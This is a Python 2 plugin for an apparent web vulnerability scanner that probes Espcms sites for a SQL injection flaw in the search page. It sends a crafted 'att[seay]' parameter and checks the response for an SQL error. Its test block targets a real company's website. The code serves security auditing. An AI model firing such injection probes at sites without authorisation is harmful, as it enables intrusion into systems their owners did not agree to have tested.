#!/usr/bin/python2.7
#coding:utf-8

import requests
from dummy import *

info = {
	'NAME':'Espcms Search SQL Injection',
	'AUTHOR':'seay,yangbh',
	'TIME':'20140811',
	'WEB':'',
	'DESCRIPTION':'Via: http://blog.163.com/j8g_/blog/static/217780396201321312334801/'
}

def Audit(services):
	retinfo = None
	output = ''
	if services.has_key('url') and services.has_key('cms'):
		if services['cms'] == 'Espcms':
			output += 'plugin run' + os.linesep
			url = services['url'] + '/index.php?ac=search&at=list&att[seay]=bugscan'
			try:
				rqu = requests.get(url)
				if rqu.status_code == 200 and rqu.text.find('ESPCMS SQL Error:') != -1:
					retinfo = {'level':'low','content':url}
					output += 'Vula:\t' + url
			except:
				pass
	return (retinfo,output)
# ----------------------------------------------------------------------------------------------------
#	untest yet
# ----------------------------------------------------------------------------------------------------
if __name__=='__main__':
	services = {'url':'http://www.hengtiansoft.com'}
	pprint(Audit(services))
	pprint(services)